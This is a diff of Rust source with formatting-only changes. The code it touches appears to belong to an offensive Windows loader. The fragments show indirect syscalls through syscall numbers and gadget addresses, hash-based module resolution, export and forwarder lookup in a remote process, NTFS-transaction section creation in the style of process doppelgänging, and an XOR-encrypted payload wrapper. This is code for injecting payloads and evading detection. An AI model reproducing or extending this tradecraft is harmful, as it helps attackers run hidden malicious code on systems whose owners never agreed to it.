@@ -456,8 +456,7 @@ pub(crate) unsafe fn set_current_transaction(tx_handle: usize) -> Result<(), Str
             }
             return Err(format!(
                 "RtlSetCurrentTransaction({:#x}) returned {:#x}",
-                tx_handle,
-                status as u32
+                tx_handle, status as u32
             ));
         }
     }
@@ -472,10 +471,10 @@ pub(crate) unsafe fn set_current_transaction(tx_handle: usize) -> Result<(), Str
             target.ssn,
             target.gadget_addr,
             &[
-                0xFFFFFFFFFFFFFFFEu64,              // NtCurrentThread() pseudo-handle
-                40u64,                              // ThreadTransactionContext
+                0xFFFFFFFFFFFFFFFEu64,                 // NtCurrentThread() pseudo-handle
+                40u64,                                 // ThreadTransactionContext
                 &tx_handle_local as *const u64 as u64, // Pointer to HANDLE value
-                8u64,                               // Length of HANDLE
+                8u64,                                  // Length of HANDLE
             ],
         );
         if status >= 0 {
@@ -594,8 +593,12 @@ unsafe fn resolve_remote_module_by_name(
         pe_resolve::get_module_handle_by_hash(hash_ext)
     });
 
-    let base = module_base
-        .ok_or_else(|| format!("cannot resolve local module '{}'", String::from_utf8_lossy(module_name)))?;
+    let base = module_base.ok_or_else(|| {
+        format!(
+            "cannot resolve local module '{}'",
+            String::from_utf8_lossy(module_name)
+        )
+    })?;
 
     // Verify the module is mapped in the remote process at the same address
     // by reading the MZ header.
@@ -668,15 +671,12 @@ unsafe fn resolve_forwarded_remote_export(
     let forwarder = &forwarder_buf[..forwarder_len];
 
     // Split on '.' to get "MODULE" and "Function".
-    let dot_pos = forwarder
-        .iter()
-        .position(|&b| b == b'.')
-        .ok_or_else(|| {
-            format!(
-                "forwarder string has no '.': {:?}",
-                String::from_utf8_lossy(forwarder)
-            )
-        })?;
+    let dot_pos = forwarder.iter().position(|&b| b == b'.').ok_or_else(|| {
+        format!(
+            "forwarder string has no '.': {:?}",
+            String::from_utf8_lossy(forwarder)
+        )
+    })?;
 
     if dot_pos == 0 || dot_pos + 1 >= forwarder_len {
         return Err(format!(
@@ -689,8 +689,7 @@ unsafe fn resolve_forwarded_remote_export(
     let function_part = &forwarder[dot_pos + 1..];
 
     // Resolve the target module in the remote process.
-    let target_module_base =
-        resolve_remote_module_by_name(process_handle, module_name)?;
+    let target_module_base = resolve_remote_module_by_name(process_handle, module_name)?;
 
     // Handle ordinal forwarders (e.g. "NTDLL.#42").
     if function_part.starts_with(b"#") {
@@ -703,11 +702,7 @@ unsafe fn resolve_forwarded_remote_export(
         // To resolve by ordinal we need to read the export directory of the
         // target module and index into the function table using
         // (ordinal - Base).
-        return resolve_remote_export_by_ordinal(
-            process_handle,
-            target_module_base,
-            ordinal,
-        );
+        return resolve_remote_export_by_ordinal(process_handle, target_module_base, ordinal);
     }
 
     // Name-based forwarder: resolve the function export in the target module.
@@ -1066,9 +1061,7 @@ unsafe fn resolve_remote_export(
             // ASCII forwarder string like "NTDLL.EtwEventWrite".
             let dir_rva = export_dir_rva as usize;
             let dir_size = export_dir_size as usize;
-            if func_rva >= dir_rva
-                && func_rva < dir_rva.saturating_add(dir_size)
-            {
+            if func_rva >= dir_rva && func_rva < dir_rva.saturating_add(dir_size) {
                 return resolve_forwarded_remote_export(
                     process_handle,
                     module_base,
@@ -1669,9 +1662,8 @@ unsafe fn create_transacted_section(
     // This enlists all subsequent file I/O on this thread into the
     // transaction.  The correct NT mechanism — do NOT place the tx handle
     // in OBJECT_ATTRIBUTES.RootDirectory (that is a directory handle field).
-    set_current_transaction(tx_handle).map_err(|e| {
-        format!("set_current_transaction failed: {}", e)
-    })?;
+    set_current_transaction(tx_handle)
+        .map_err(|e| format!("set_current_transaction failed: {}", e))?;
 
     // ── Step 2: Build temp file NT path ─────────────────────────────
     // Path: \??\C:\Windows\Temp\~tmpXXXX.tmp  (randomised suffix)
@@ -1973,11 +1965,7 @@ impl GuardedPayload {
         }
         // Zero the encrypted buffer and key.
         unsafe {
-            std::ptr::write_bytes(
-                self.encrypted.as_mut_ptr(),
-                0,
-                self.encrypted.len(),
-            );
+            std::ptr::write_bytes(self.encrypted.as_mut_ptr(), 0, self.encrypted.len());
             std::ptr::write_bytes(self.key.as_mut_ptr(), 0, XOR_KEY_LEN);
         }
         plaintext
